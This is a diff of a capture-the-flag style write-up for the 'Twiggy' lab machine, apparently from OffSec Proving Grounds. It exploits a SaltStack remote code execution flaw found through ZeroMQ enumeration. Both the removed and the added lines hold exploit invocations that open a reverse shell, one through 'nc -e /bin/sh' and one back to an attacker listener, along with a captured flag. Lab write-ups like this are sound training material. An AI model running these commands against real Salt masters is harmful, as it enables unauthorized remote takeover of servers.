@@ -1,22 +1,27 @@
 ---
-alias: twiggy
-tags: [pg-playground, linux, enumeration, exploitation]
+aliases:
+  - twiggy
+tags:
+  - pg-playground
+  - linux
+  - enumeration
+  - exploitation
 os: Linux
-difficulty: Medium
+difficulty: Warm up
 date: 2025-04-09
 status: owned
 ---
 ### 1. Box Summary
 
-| Field          | Value               |
-| -------------- | ------------------- |
-| Name           | Twiggy              |
-| IP             | `192.168.145.62`    |
-| OS             | Linux               |
-| Difficulty     | Medium              |
-| Date Completed | 9 April 2025        |
-| Exploited Via  | RCE → LFI → PrivEsc |
-| Flags Captured | ✅ User, ✅ Root      |
+| Field          | Value            |
+| -------------- | ---------------- |
+| Name           | Twiggy           |
+| IP             | `192.168.145.62` |
+| OS             | Linux            |
+| Difficulty     | Medium           |
+| Date Completed | 9 April 2025     |
+| Exploited Via  | RCE              |
+| Flags Captured | ✅ Root           |
 
 ### 2. Enumeration
 
@@ -54,21 +59,55 @@ Nmap done: 1 IP address (1 host up) scanned in 108.93 seconds
 ```
 
 Of course we open the port 80 first
-![[Twiggy-1744177123093.jpeg]]
+![[images/Twiggy-1744177123093.jpeg]]
 
 Oh look there's an admin interface button
 
-![[Twiggy-1744178077284.jpeg]]
+![[images/Twiggy-1744178077284.jpeg]]
 
 After trying out the admin... nah it aint that easy. So we take a look at port 8000, time to do some research on ZeroMQ ZMTP 2.0 as well 
 
-![[Twiggy-1744178200043.jpeg]]
+![[images/Twiggy-1744178200043.jpeg]]
 
-Apparently we have something good on [exploitDB](https://www.exploit-db.com/exploits/48421) , let's just run Saltstack 3000.1 - Remote Code Execution like some script kiddie, and my guy actually uploaded a [poc](https://github.com/jasperla/CVE-2020-11651-poc) for it... good stuff
+Apparently we have something good on [exploitDB](https://www.exploit-db.com/exploits/48421) , let's just run Saltstack 3000.1 - Remote Code Execution like some script kiddie, and my guy actually uploaded a [poc](https://github.com/Al1ex/CVE-2020-11652/blob/main/CVE-2020-11652.py) for it... good stuff
 
-
+🔹 Create & Activate Virtual Environment
 ```
-python3 exploit.py --master 192.168.145.62 --exec "nc 127.0.0.1 4444 -e /bin/sh"
+python3 -m venv salt-venv
+source salt-venv/bin/activate
 ```
 
-python3 exploit.py --master 192.168.145.62 --port 4506 -lh 192.168.45.197 -lp 1337 --exec-choose master
+🔹 Install Dependencies
+```
+pip install salt==3002 msgpack PyYAML pyzmq jinja2 tornado requests
+```
+
+We will prep it by noting down:
+- **Kali IP**: `192.168.45.197`
+- **Target IP**: `192.168.145.62`
+- **Listener Port**: `80`
+
+🔹 Set up listener
+```
+nc -lvnp 80
+```
+
+🔹 Run the exploit
+```
+python3 exploit.py \
+  --master 192.168.145.62 \
+  --port 4506 \
+  --shell-LHOST 192.168.45.197 \
+  --shell-LPORT 80
+```
+
+![[images/Twiggy-1744181043545.jpeg]]
+
+Listener side:
+
+![[images/Twiggy-1744181018801.jpeg]]
+
+FLAG:
+```
+02e2283f7e95835128a4a48a72dfd629
+```
